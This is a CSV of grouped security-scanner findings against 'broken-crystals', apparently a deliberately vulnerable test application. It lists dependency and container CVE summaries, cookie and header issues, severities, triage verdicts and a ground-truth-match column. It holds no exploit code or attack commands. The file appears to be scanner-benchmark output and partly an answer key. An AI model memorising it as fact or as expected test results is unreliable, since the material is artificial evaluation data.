finding_group_id,tools,target,cwe,severity,location,description,verdict,confidence,ground_truth_match,tool_count
GRP-broken-crystals--001,npm-audit,broken-crystals,,info,@angular-devkit/core,Dependency of: ajv,pending,low,no,1
GRP-broken-crystals--002,npm-audit,broken-crystals,,info,@angular-devkit/schematics,Dependency of: @angular-devkit/core,pending,low,no,1
GRP-broken-crystals--003,npm-audit,broken-crystals,,info,@angular-devkit/schematics-cli,"Dependency of: @angular-devkit/core, @angular-devkit/schematics, inquirer",pending,low,no,1
GRP-broken-crystals--004,npm-audit,broken-crystals,,info,@fastify/http-proxy,Dependency of: @fastify/reply-from,pending,low,no,1
GRP-broken-crystals--005,npm-audit,broken-crystals,,high,@mapbox/node-pre-gyp,Dependency of: tar,pending,low,no,1
GRP-broken-crystals--006,npm-audit,broken-crystals,,high,@nestjs/cli,"Dependency of: @angular-devkit/core, @angular-devkit/schematics, @angular-devkit/schematics-cli, @nestjs/schematics, glob, inquirer, webpack",pending,low,no,1
GRP-broken-crystals--007,npm-audit,broken-crystals,,info,@nestjs/config,Dependency of: lodash,pending,low,no,1
GRP-broken-crystals--008,npm-audit|nuclei,broken-crystals,,info,@nestjs/graphql,Dependency of: lodash,TP,high,no,2
GRP-broken-crystals--009,npm-audit,broken-crystals,,info,@nestjs/mercurius,"Dependency of: @nestjs/graphql, fastify",pending,low,no,1
GRP-broken-crystals--010,npm-audit,broken-crystals,,info,@nestjs/swagger,"Dependency of: js-yaml, lodash",pending,low,no,1
GRP-broken-crystals--011,npm-audit,broken-crystals,,low,@sectester/runner,Dependency of: fastify,pending,low,no,1
GRP-broken-crystals--012,npm-audit,broken-crystals,,low,external-editor,Dependency of: tmp,pending,low,no,1
GRP-broken-crystals--013,npm-audit,broken-crystals,,low,inquirer,Dependency of: external-editor,pending,low,no,1
GRP-broken-crystals--014,npm-audit,broken-crystals,,low,jwk-to-pem,Dependency of: elliptic,pending,low,no,1
GRP-broken-crystals--015,npm-audit,broken-crystals,,high,terser-webpack-plugin,Dependency of: serialize-javascript,pending,low,no,1
GRP-broken-crystals--016,trivy,broken-crystals,,low,curl@7.64.0-4+deb10u5,curl: cookie injection with none file,pending,low,no,1
GRP-broken-crystals--017,trivy,broken-crystals,,info,debian-archive-keyring@2019.1+deb10u1,debian-archive-keyring - security update,pending,low,no,1
GRP-broken-crystals--018,trivy,broken-crystals,,high,git@1:2.20.1-2+deb10u8,git: Remote code execution in recursive clones with nested submodules,pending,low,no,1
GRP-broken-crystals--019,trivy,broken-crystals,,high,git-man@1:2.20.1-2+deb10u8,git: Remote code execution in recursive clones with nested submodules,pending,low,no,1
GRP-broken-crystals--020,trivy,broken-crystals,,low,libcurl3-gnutls@7.64.0-4+deb10u5,curl: cookie injection with none file,pending,low,no,1
GRP-broken-crystals--021,trivy,broken-crystals,,low,libcurl4@7.64.0-4+deb10u5,curl: cookie injection with none file,pending,low,no,1
GRP-broken-crystals--022,trivy,broken-crystals,,low,libcurl4-openssl-dev@7.64.0-4+deb10u5,curl: cookie injection with none file,pending,low,no,1
GRP-broken-crystals--023,trivy,broken-crystals,,high,libheif1@1.3.2-2~deb10u1,"Floating point exception in function Fraction in libheif 1.4.0, allows ...",pending,low,no,1
GRP-broken-crystals--024,trivy,broken-crystals,,medium,libmariadb-dev@1:10.3.38-0+deb10u1,mysql: InnoDB unspecified vulnerability (CPU Oct 2023),pending,low,no,1
GRP-broken-crystals--025,trivy,broken-crystals,,medium,libmariadb-dev-compat@1:10.3.38-0+deb10u1,mysql: InnoDB unspecified vulnerability (CPU Oct 2023),pending,low,no,1
GRP-broken-crystals--026,trivy,broken-crystals,,medium,libmariadb3@1:10.3.38-0+deb10u1,mysql: InnoDB unspecified vulnerability (CPU Oct 2023),pending,low,no,1
GRP-broken-crystals--027,trivy,broken-crystals,,medium,libncurses-dev@6.1+20181013-2+deb10u3,ncurses: segmentation fault via _nc_wrap_entry(),pending,low,no,1
GRP-broken-crystals--028,trivy,broken-crystals,,medium,libncurses5-dev@6.1+20181013-2+deb10u3,ncurses: segmentation fault via _nc_wrap_entry(),pending,low,no,1
GRP-broken-crystals--029,trivy,broken-crystals,,medium,libncurses6@6.1+20181013-2+deb10u3,ncurses: segmentation fault via _nc_wrap_entry(),pending,low,no,1
GRP-broken-crystals--030,trivy,broken-crystals,,medium,libncursesw5-dev@6.1+20181013-2+deb10u3,ncurses: segmentation fault via _nc_wrap_entry(),pending,low,no,1
GRP-broken-crystals--031,trivy,broken-crystals,,medium,libncursesw6@6.1+20181013-2+deb10u3,ncurses: segmentation fault via _nc_wrap_entry(),pending,low,no,1
GRP-broken-crystals--032,trivy,broken-crystals,,medium,libpython2.7-minimal@2.7.16-2+deb10u1,python: TLS handshake bypass,pending,low,no,1
GRP-broken-crystals--033,trivy,broken-crystals,,medium,libpython2.7-stdlib@2.7.16-2+deb10u1,python: TLS handshake bypass,pending,low,no,1
GRP-broken-crystals--034,trivy,broken-crystals,,high,libpython3.7-minimal@3.7.3-2+deb10u4,python: Path traversal on tempfile.TemporaryDirectory,pending,low,no,1
GRP-broken-crystals--035,trivy,broken-crystals,,high,libpython3.7-stdlib@3.7.3-2+deb10u4,python: Path traversal on tempfile.TemporaryDirectory,pending,low,no,1
GRP-broken-crystals--036,trivy,broken-crystals,,high,libsqlite3-0@3.27.2-3+deb10u2,sqlite: mishandling of certain SELECT statements with non-existent VIEW can lead to DoS,pending,low,no,1
GRP-broken-crystals--037,trivy,broken-crystals,,high,libsqlite3-dev@3.27.2-3+deb10u2,sqlite: mishandling of certain SELECT statements with non-existent VIEW can lead to DoS,pending,low,no,1
GRP-broken-crystals--038,trivy,broken-crystals,,medium,libtinfo6@6.1+20181013-2+deb10u3,ncurses: segmentation fault via _nc_wrap_entry(),pending,low,no,1
GRP-broken-crystals--039,trivy,broken-crystals,,high,linux-libc-dev@4.19.269-1,kernel: f2fs: explicitly null-terminate the xattr list,pending,low,no,1
GRP-broken-crystals--040,trivy,broken-crystals,,medium,mariadb-common@1:10.3.38-0+deb10u1,mysql: InnoDB unspecified vulnerability (CPU Oct 2023),pending,low,no,1
GRP-broken-crystals--041,trivy,broken-crystals,,medium,ncurses-base@6.1+20181013-2+deb10u3,ncurses: segmentation fault via _nc_wrap_entry(),pending,low,no,1
GRP-broken-crystals--042,trivy,broken-crystals,,medium,ncurses-bin@6.1+20181013-2+deb10u3,ncurses: segmentation fault via _nc_wrap_entry(),pending,low,no,1
GRP-broken-crystals--043,trivy,broken-crystals,,high,openssh-client@1:7.9p1-10+deb10u2,openssh: privilege escalation when AuthorizedKeysCommand or AuthorizedPrincipalsCommand are configured,pending,low,no,1
GRP-broken-crystals--044,trivy,broken-crystals,,medium,python2.7@2.7.16-2+deb10u1,python: TLS handshake bypass,pending,low,no,1
GRP-broken-crystals--045,trivy,broken-crystals,,medium,python2.7-minimal@2.7.16-2+deb10u1,python: TLS handshake bypass,pending,low,no,1
GRP-broken-crystals--046,trivy,broken-crystals,,high,python3.7@3.7.3-2+deb10u4,python: Path traversal on tempfile.TemporaryDirectory,pending,low,no,1
GRP-broken-crystals--047,trivy,broken-crystals,,high,python3.7-minimal@3.7.3-2+deb10u4,python: Path traversal on tempfile.TemporaryDirectory,pending,low,no,1
GRP-broken-crystals--048,trivy,broken-crystals,,low,tar@1.30+dfsg-6,tar: Incorrectly handled extension attributes in PAX archives can lead to a crash,pending,low,no,1
GRP-broken-crystals--049,trivy,broken-crystals,,info,tzdata@2021a-0+deb10u10,tzdata - new timezone database,pending,low,no,1
GRP-broken-crystals--050,trivy,broken-crystals,,high,base64url@2.0.0,Out-of-bounds Read,pending,low,no,1
GRP-broken-crystals--051,trivy,broken-crystals,,critical,elliptic@6.5.4,Elliptic's private key extraction in ECDSA upon signing a malformed input (e.g. a string),pending,low,no,1
GRP-broken-crystals--052,trivy,broken-crystals,,medium,got@6.7.1,nodejs-got: missing verification of requested URLs allows redirects to UNIX sockets,pending,low,no,1
GRP-broken-crystals--053,zap,broken-crystals,,info,http://host.docker.internal:3001,Session Management Response Identified,pending,low,no,1
GRP-broken-crystals--054,nuclei,broken-crystals,,info,localhost:3001,Cookies without HttpOnly attribute - Detect,pending,low,no,1
GRP-broken-crystals--055,nuclei,broken-crystals,,info,http://localhost:3001,HTTP Missing Security Headers,pending,low,no,1
GRP-broken-crystals--056,nuclei,broken-crystals,,info,http://localhost:3001,HTTP Missing Security Headers,pending,low,no,1
GRP-broken-crystals--057,nuclei,broken-crystals,,info,http://localhost:3001,HTTP Missing Security Headers,pending,low,no,1
GRP-broken-crystals--058,nuclei,broken-crystals,,info,http://localhost:3001,HTTP Missing Security Headers,pending,low,no,1
GRP-broken-crystals--059,nuclei,broken-crystals,,info,http://localhost:3001,HTTP Missing Security Headers,pending,low,no,1
GRP-broken-crystals--060,nuclei,broken-crystals,,info,http://localhost:3001,HTTP Missing Security Headers,pending,low,no,1
GRP-broken-crystals--061,nuclei,broken-crystals,,info,http://localhost:3001,HTTP Missing Security Headers,pending,low,no,1
GRP-broken-crystals--062,nuclei,broken-crystals,,info,http://localhost:3001,HTTP Missing Security Headers,pending,low,no,1
GRP-broken-crystals--063,nuclei,broken-crystals,,info,http://localhost:3001,HTTP Missing Security Headers,pending,low,no,1
GRP-broken-crystals--064,nuclei,broken-crystals,,info,http://localhost:3001,HTTP Missing Security Headers,pending,low,no,1
GRP-broken-crystals--065,nuclei,broken-crystals,,info,http://localhost:3001,HTTP Missing Security Headers,pending,low,no,1
GRP-broken-crystals-CWE-1004-066,zap,broken-crystals,CWE-1004,low,http://host.docker.internal:3001,Cookie No HttpOnly Flag,TP,medium,yes,1
GRP-broken-crystals-CWE-1004-067,bearer,broken-crystals,CWE-1004,info,src/main.ts:191,"## Description Your cookies are at risk if the HTTP Only option is not configured. This setting prevents client-side JavaScript, such as the code that reads ""document.cookie"" values, from accessing the cookie's value. Enabling this option is crucial for websites prone to Cross-Site Scripting (XSS) attacks, because it prevents malicious scripts from obtaining the cookie's data. ## Remediations - **Do** set the `HttpOnly` attribute to `true` in your cookie configuration. This action ensures that cookies are shielded from unauthorized client-side access. ```javascript cookie({ httpOnly: true }); ``` ## References - [Express Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html#use-cookies-securely)",TP,medium,yes,1
GRP-broken-crystals-CWE-1050-068,trivy,broken-crystals,CWE-1050,high,braces@2.3.2,braces: fails to limit the number of characters it can handle,pending,low,no,1
GRP-broken-crystals-CWE-1050-069,trivy,broken-crystals,CWE-1050,high,braces@3.0.2,braces: fails to limit the number of characters it can handle,pending,low,no,1
GRP-broken-crystals-CWE-114-070,trivy,broken-crystals,CWE-114,high,git@1:2.20.1-2+deb10u8,git: RCE while cloning local repos,pending,low,no,1
GRP-broken-crystals-CWE-114-071,trivy,broken-crystals,CWE-114,high,git-man@1:2.20.1-2+deb10u8,git: RCE while cloning local repos,pending,low,no,1
GRP-broken-crystals-CWE-119-072,trivy,broken-crystals,CWE-119,low,libcroco3@0.6.12-3,libcroco: Memory allocation failure in the cr_tknzr_parse_comment function,pending,low,no,1
GRP-broken-crystals-CWE-119-073,trivy,broken-crystals,CWE-119,medium,libtiff-dev@4.1.0+git191117-2~deb10u7,libtiff: memory leak in tiffcrop.c,pending,low,no,1
GRP-broken-crystals-CWE-119-074,trivy,broken-crystals,CWE-119,medium,libtiff5@4.1.0+git191117-2~deb10u7,libtiff: memory leak in tiffcrop.c,pending,low,no,1
GRP-broken-crystals-CWE-119-075,trivy,broken-crystals,CWE-119,medium,libtiffxx5@4.1.0+git191117-2~deb10u7,libtiff: memory leak in tiffcrop.c,pending,low,no,1
GRP-broken-crystals-CWE-119-076,trivy,broken-crystals,CWE-119,high,libx11-6@2:1.6.7-1+deb10u2,libX11: InitExt.c can overwrite unintended portions of the Display structure if the extension request leads to a buffer overflow,pending,low,no,1
GRP-broken-crystals-CWE-119-077,trivy,broken-crystals,CWE-119,high,libx11-data@2:1.6.7-1+deb10u2,libX11: InitExt.c can overwrite unintended portions of the Display structure if the extension request leads to a buffer overflow,pending,low,no,1
GRP-broken-crystals-CWE-119-078,trivy,broken-crystals,CWE-119,high,libx11-dev@2:1.6.7-1+deb10u2,libX11: InitExt.c can overwrite unintended portions of the Display structure if the extension request leads to a buffer overflow,pending,low,no,1
GRP-broken-crystals-CWE-119-079,trivy,broken-crystals,CWE-119,medium,libxml2@2.9.4+dfsg1-7+deb10u5,libxml2: crafted xml can cause global buffer overflow,pending,low,no,1
GRP-broken-crystals-CWE-119-080,trivy,broken-crystals,CWE-119,medium,libxml2-dev@2.9.4+dfsg1-7+deb10u5,libxml2: crafted xml can cause global buffer overflow,pending,low,no,1
GRP-broken-crystals-CWE-119-081,trivy,broken-crystals,CWE-119,high,linux-libc-dev@4.19.269-1,kernel: nfp: use-after-free in area_cache_get(),pending,low,no,1
GRP-broken-crystals-CWE-120-082,trivy,broken-crystals,CWE-120,high,imagemagick@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-083,trivy,broken-crystals,CWE-120,high,imagemagick-6-common@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-084,trivy,broken-crystals,CWE-120,high,imagemagick-6.q16@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-085,trivy,broken-crystals,CWE-120,high,libde265-0@1.0.11-0+deb10u4,Libde265 v1.0.12 was discovered to contain multiple buffer overflows v ...,pending,low,no,1
GRP-broken-crystals-CWE-120-086,trivy,broken-crystals,CWE-120,high,libheif1@1.3.2-2~deb10u1,Buffer overflow vulnerability in function convert_colorspace in heif_c ...,pending,low,no,1
GRP-broken-crystals-CWE-120-087,trivy,broken-crystals,CWE-120,high,libmagickcore-6-arch-config@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-088,trivy,broken-crystals,CWE-120,high,libmagickcore-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-089,trivy,broken-crystals,CWE-120,high,libmagickcore-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-090,trivy,broken-crystals,CWE-120,high,libmagickcore-6.q16-6-extra@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-091,trivy,broken-crystals,CWE-120,high,libmagickcore-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-092,trivy,broken-crystals,CWE-120,high,libmagickcore-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-093,trivy,broken-crystals,CWE-120,high,libmagickwand-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-094,trivy,broken-crystals,CWE-120,high,libmagickwand-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-095,trivy,broken-crystals,CWE-120,high,libmagickwand-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-096,trivy,broken-crystals,CWE-120,high,libmagickwand-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-097,trivy,broken-crystals,CWE-120,critical,libpython2.7-minimal@2.7.16-2+deb10u1,python: Stack-based buffer overflow in PyCArg_repr in _ctypes/callproc.c,pending,low,no,1
GRP-broken-crystals-CWE-120-098,trivy,broken-crystals,CWE-120,critical,libpython2.7-stdlib@2.7.16-2+deb10u1,python: Stack-based buffer overflow in PyCArg_repr in _ctypes/callproc.c,pending,low,no,1
GRP-broken-crystals-CWE-120-099,trivy,broken-crystals,CWE-120,medium,libtiff-dev@4.1.0+git191117-2~deb10u7,libtiff: Buffer Overflow via /libtiff/tools/tiffcrop.c,pending,low,no,1
GRP-broken-crystals-CWE-120-100,trivy,broken-crystals,CWE-120,medium,libtiff5@4.1.0+git191117-2~deb10u7,libtiff: Buffer Overflow via /libtiff/tools/tiffcrop.c,pending,low,no,1
GRP-broken-crystals-CWE-120-101,trivy,broken-crystals,CWE-120,medium,libtiffxx5@4.1.0+git191117-2~deb10u7,libtiff: Buffer Overflow via /libtiff/tools/tiffcrop.c,pending,low,no,1
GRP-broken-crystals-CWE-120-102,trivy,broken-crystals,CWE-120,high,linux-libc-dev@4.19.269-1,kernel: buffer overflow in drivers/net/ethernet/xilinx/ll_temac_main.c by sending heavy network traffic for about ten minutes,pending,low,no,1
GRP-broken-crystals-CWE-120-103,trivy,broken-crystals,CWE-120,critical,python2.7@2.7.16-2+deb10u1,python: Stack-based buffer overflow in PyCArg_repr in _ctypes/callproc.c,pending,low,no,1
GRP-broken-crystals-CWE-120-104,trivy,broken-crystals,CWE-120,critical,python2.7-minimal@2.7.16-2+deb10u1,python: Stack-based buffer overflow in PyCArg_repr in _ctypes/callproc.c,pending,low,no,1
GRP-broken-crystals-CWE-121-105,trivy,broken-crystals,CWE-121,high,libc-bin@2.28-10+deb10u2,glibc: stack-based buffer overflow in netgroup cache,pending,low,no,1
GRP-broken-crystals-CWE-121-106,trivy,broken-crystals,CWE-121,high,libc-dev-bin@2.28-10+deb10u2,glibc: stack-based buffer overflow in netgroup cache,pending,low,no,1
GRP-broken-crystals-CWE-121-107,trivy,broken-crystals,CWE-121,high,libc6@2.28-10+deb10u2,glibc: stack-based buffer overflow in netgroup cache,pending,low,no,1
GRP-broken-crystals-CWE-121-108,trivy,broken-crystals,CWE-121,high,libc6-dev@2.28-10+deb10u2,glibc: stack-based buffer overflow in netgroup cache,pending,low,no,1
GRP-broken-crystals-CWE-121-109,trivy,broken-crystals,CWE-121,medium,libde265-0@1.0.11-0+deb10u4,Buffer Overflow vulnerability in libde265 v1.0.12 allows a local attac ...,pending,low,no,1
GRP-broken-crystals-CWE-122-110,trivy,broken-crystals,CWE-122,high,imagemagick@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-111,trivy,broken-crystals,CWE-122,high,imagemagick-6-common@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-112,trivy,broken-crystals,CWE-122,high,imagemagick-6.q16@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-113,trivy,broken-crystals,CWE-122,high,libmagickcore-6-arch-config@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-114,trivy,broken-crystals,CWE-122,high,libmagickcore-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-115,trivy,broken-crystals,CWE-122,high,libmagickcore-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-116,trivy,broken-crystals,CWE-122,high,libmagickcore-6.q16-6-extra@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-117,trivy,broken-crystals,CWE-122,high,libmagickcore-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-118,trivy,broken-crystals,CWE-122,high,libmagickcore-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-119,trivy,broken-crystals,CWE-122,high,libmagickwand-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-120,trivy,broken-crystals,CWE-122,high,libmagickwand-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-121,trivy,broken-crystals,CWE-122,high,libmagickwand-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-122,trivy,broken-crystals,CWE-122,high,libmagickwand-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-based buffer overflow in PopShortPixel in MagickCore/quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-122-123,trivy,broken-crystals,CWE-122,low,libprocps7@2:3.3.15-2,procps: ps buffer overflow,pending,low,no,1
GRP-broken-crystals-CWE-122-124,trivy,broken-crystals,CWE-122,high,libsqlite3-0@3.27.2-3+deb10u2,sqlite: heap-buffer-overflow at sessionfuzz,pending,low,no,1
GRP-broken-crystals-CWE-122-125,trivy,broken-crystals,CWE-122,high,libsqlite3-dev@3.27.2-3+deb10u2,sqlite: heap-buffer-overflow at sessionfuzz,pending,low,no,1
GRP-broken-crystals-CWE-122-126,trivy,broken-crystals,CWE-122,high,libtiff-dev@4.1.0+git191117-2~deb10u7,libtiff: Segment fault in libtiff in TIFFReadRGBATileExt() leading to denial of service,pending,low,no,1
GRP-broken-crystals-CWE-122-127,trivy,broken-crystals,CWE-122,high,libtiff5@4.1.0+git191117-2~deb10u7,libtiff: Segment fault in libtiff in TIFFReadRGBATileExt() leading to denial of service,pending,low,no,1
GRP-broken-crystals-CWE-122-128,trivy,broken-crystals,CWE-122,high,libtiffxx5@4.1.0+git191117-2~deb10u7,libtiff: Segment fault in libtiff in TIFFReadRGBATileExt() leading to denial of service,pending,low,no,1
GRP-broken-crystals-CWE-122-129,trivy,broken-crystals,CWE-122,high,libx11-6@2:1.6.7-1+deb10u2,libX11: integer overflow in XCreateImage() leading to a heap overflow,pending,low,no,1
GRP-broken-crystals-CWE-122-130,trivy,broken-crystals,CWE-122,high,libx11-data@2:1.6.7-1+deb10u2,libX11: integer overflow in XCreateImage() leading to a heap overflow,pending,low,no,1
GRP-broken-crystals-CWE-122-131,trivy,broken-crystals,CWE-122,high,libx11-dev@2:1.6.7-1+deb10u2,libX11: integer overflow in XCreateImage() leading to a heap overflow,pending,low,no,1
GRP-broken-crystals-CWE-122-132,trivy,broken-crystals,CWE-122,low,procps@2:3.3.15-2,procps: ps buffer overflow,pending,low,no,1
GRP-broken-crystals-CWE-1240-133,npm-audit,broken-crystals,CWE-1240,low,elliptic,Elliptic Uses a Cryptographic Primitive with a Risky Implementation,pending,low,no,1
GRP-broken-crystals-CWE-1240-134,dep-check,broken-crystals,CWE-1240,low,elliptic:6.6.1,"The ECDSA implementation of the Elliptic package generates incorrect signatures if an interim value of 'k' (as computed based on step 3.2 of RFC 6979 https://datatracker.ietf.org/doc/html/rfc6979 ) has leading zeros and is susceptible to cryptanalysis, which can lead to secret key exposure. This happens, because the byte-length of 'k' is incorrectly computed, resulting in its getting truncated during the computation. Legitimate transactions or communications will be broken as a result. Furthermore, due to the nature of the fault, attackers could–under certain conditions–derive the secret key, if they could get their hands on both a faulty signature generated by a vulnerable version of Elliptic and a correct signature for the same inputs. This issue affects all known versions of Elliptic (at the time of writing, versions less than or equal to 6.6.1).",pending,low,no,1
GRP-broken-crystals-CWE-1240-135,trivy,broken-crystals,CWE-1240,low,elliptic@6.5.4,elliptic: Key handling flaws in Elliptic,pending,low,no,1
GRP-broken-crystals-CWE-125-136,trivy,broken-crystals,CWE-125,high,comerr-dev@2.1-1.44.5-1+deb10u3,e2fsprogs: out-of-bounds read/write via crafted filesystem,pending,low,no,1
GRP-broken-crystals-CWE-125-137,trivy,broken-crystals,CWE-125,high,e2fsprogs@1.44.5-1+deb10u3,e2fsprogs: out-of-bounds read/write via crafted filesystem,pending,low,no,1
GRP-broken-crystals-CWE-125-138,trivy,broken-crystals,CWE-125,high,libcom-err2@1.44.5-1+deb10u3,e2fsprogs: out-of-bounds read/write via crafted filesystem,pending,low,no,1
GRP-broken-crystals-CWE-125-139,trivy,broken-crystals,CWE-125,critical,libdb5.3@5.3.28+dfsg1-0.5,sqlite: heap out-of-bound read in function rtreenode(),pending,low,no,1
GRP-broken-crystals-CWE-125-140,trivy,broken-crystals,CWE-125,critical,libdb5.3-dev@5.3.28+dfsg1-0.5,sqlite: heap out-of-bound read in function rtreenode(),pending,low,no,1
GRP-broken-crystals-CWE-125-141,trivy,broken-crystals,CWE-125,high,libext2fs2@1.44.5-1+deb10u3,e2fsprogs: out-of-bounds read/write via crafted filesystem,pending,low,no,1
GRP-broken-crystals-CWE-125-142,trivy,broken-crystals,CWE-125,high,libheif1@1.3.2-2~deb10u1,An issue was discovered in heif::Box_iref::get_references in libheif 1 ...,pending,low,no,1
GRP-broken-crystals-CWE-125-143,trivy,broken-crystals,CWE-125,low,libsepol1@2.8-1,libsepol: heap-based buffer overflow in ebitmap_match_any(),pending,low,no,1
GRP-broken-crystals-CWE-125-144,trivy,broken-crystals,CWE-125,low,libsepol1-dev@2.8-1,libsepol: heap-based buffer overflow in ebitmap_match_any(),pending,low,no,1
GRP-broken-crystals-CWE-125-145,trivy,broken-crystals,CWE-125,high,libss2@1.44.5-1+deb10u3,e2fsprogs: out-of-bounds read/write via crafted filesystem,pending,low,no,1
GRP-broken-crystals-CWE-125-146,trivy,broken-crystals,CWE-125,high,libssh2-1@1.8.0-2.1,libssh2: integer overflow in kex_method_diffie_hellman_group_exchange_sha256_key_exchange in kex.c leads to out-of-bounds write,pending,low,no,1
GRP-broken-crystals-CWE-125-147,trivy,broken-crystals,CWE-125,high,linux-libc-dev@4.19.269-1,kernel: mounting a crafted f2fs filesystem image can lead to slab-out-of-bounds read access in f2fs_build_segment_manager in fs/f2fs/segment.c,pending,low,no,1
GRP-broken-crystals-CWE-1275-148,zap,broken-crystals,CWE-1275,low,http://host.docker.internal:3001,Cookie without SameSite Attribute,pending,low,no,1
GRP-broken-crystals-CWE-1284-149,trivy,broken-crystals,CWE-1284,high,linux-libc-dev@4.19.269-1,kernel: enic: Validate length of nl attributes in enic_set_vf_port,pending,low,no,1
GRP-broken-crystals-CWE-129-150,trivy,broken-crystals,CWE-129,high,linux-libc-dev@4.19.269-1,kernel: powerpc: Fix access beyond end of drmem array,pending,low,no,1
GRP-broken-crystals-CWE-130-151,trivy,broken-crystals,CWE-130,low,elliptic@6.5.4,elliptic: nodejs/elliptic: ECDSA signature malleability due to missing checks,pending,low,no,1
GRP-broken-crystals-CWE-1303-152,trivy,broken-crystals,CWE-1303,medium,linux-libc-dev@4.19.269-1,kernel: Spectre v2 SMT mitigations problem,pending,low,no,1
GRP-broken-crystals-CWE-131-153,trivy,broken-crystals,CWE-131,high,linux-libc-dev@4.19.269-1,kernel: IGB driver inadequate buffer size for frames larger than MTU,pending,low,no,1
GRP-broken-crystals-CWE-1321-154,npm-audit,broken-crystals,CWE-1321,info,js-yaml,js-yaml has prototype pollution in merge (<<),TP,medium,yes,1
GRP-broken-crystals-CWE-1321-155,npm-audit,broken-crystals,CWE-1321,info,lodash,Lodash has Prototype Pollution Vulnerability in `_.unset` and `_.omit` functions,TP,medium,yes,1
GRP-broken-crystals-CWE-1321-156,dep-check,broken-crystals,CWE-1321,info,js-yaml:4.1.0,"### Impact In js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted. ### Patches Problem is patched in js-yaml 4.1.1 and 3.14.2. ### Workarounds You can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default). ### References https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",TP,medium,yes,1
GRP-broken-crystals-CWE-1321-157,dep-check,broken-crystals,CWE-1321,info,lodash:4.17.21,### Impact Lodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. The issue permits deletion of properties but does not allow overwriting their original behavior. ### Patches This issue is patched on 4.17.23.,TP,medium,yes,1
